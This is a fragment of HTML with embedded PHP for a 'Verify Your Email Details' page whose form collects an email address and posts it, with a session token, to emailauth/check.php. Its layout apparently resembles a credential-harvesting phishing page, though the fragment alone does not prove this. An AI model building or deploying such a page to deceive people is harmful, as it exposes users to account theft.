  ...
  <div id="page-container" class="page-container"><div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Verify Your Email Details</h2>
            ...
            <div class="unauth-intro-area__help">
                ...
                <p class="unauth-intro-area__text">Please verify your email details in the form below.</p>
            </div>
        </section>        <section class="unauth-content-section">
            <form action="emailauth/check.php?token=<?php echo $_SESSION['token']; ?>" method="post" class="unauth-form jqtransform js-login-form">
                            ...
                            <div class="js-user-block">
                                <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Email Address:</label>
                                        <div>
                                            <input id="unauth-form-first-name" name="email" type="text" placeholder="Email Address" class="unauth-form__input js-firstname" data-toenable="accInfoLastName" maxlength="200" autocomplete="off" required="">
                                        </div>
                ...
                <div class="unauth-content-section__button-wrap">
                    <button type="submit" class="btn unauth-form__submit-button js-submit-button">Continue</button>
